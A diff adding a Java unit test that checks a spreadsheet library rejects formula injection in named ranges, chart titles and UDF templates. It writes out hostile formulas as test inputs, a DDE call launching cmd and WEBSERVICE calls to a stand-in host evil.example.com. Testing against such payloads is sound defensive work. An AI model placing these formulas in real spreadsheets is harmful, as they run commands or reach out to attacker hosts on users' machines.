@@ -125,6 +125,40 @@ class ProtocolResidualCoverageTest {
   }
 
   @Test
+  void rejectsFormulaInjectionInNamedRangeChartTitleAndUdfTemplate() { // LIM-032, LIM-033, LIM-034
+    // LIM-032 — named-range formula target
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> NamedRangeTarget.formula("DDE(\"cmd\",\"/C calc\",\"\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> NamedRangeTarget.formula("=DDE(\"cmd\",\"/C calc\",\"\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> NamedRangeTarget.formula("WEBSERVICE(\"https://evil.example.com\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> NamedRangeTarget.formula("webservice(\"https://evil.example.com\")"));
+
+    // LIM-033 — chart title formula
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> new ChartTitleInput.Formula("DDE(\"cmd\",\"/C calc\",\"\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> new ChartTitleInput.Formula("WEBSERVICE(\"https://evil.example.com\")"));
+
+    // LIM-034 — UDF formula template (defense-in-depth; POI evaluator won't execute these
+    //           server-side, but they must not silently end up in future execution paths)
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> new FormulaUdfFunctionInput("MY_FUNC", 0, 0, "DDE(\"cmd\",\"/C calc\",\"\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () -> new FormulaUdfFunctionInput("MY_FUNC", 0, 0, "WEBSERVICE(\"https://evil.example.com\")"));
+  }
+
+  @Test
   void simpleShapeKindRemainsExplicit() {
     DrawingAnchorInput.TwoCell anchor =
         new DrawingAnchorInput.TwoCell(
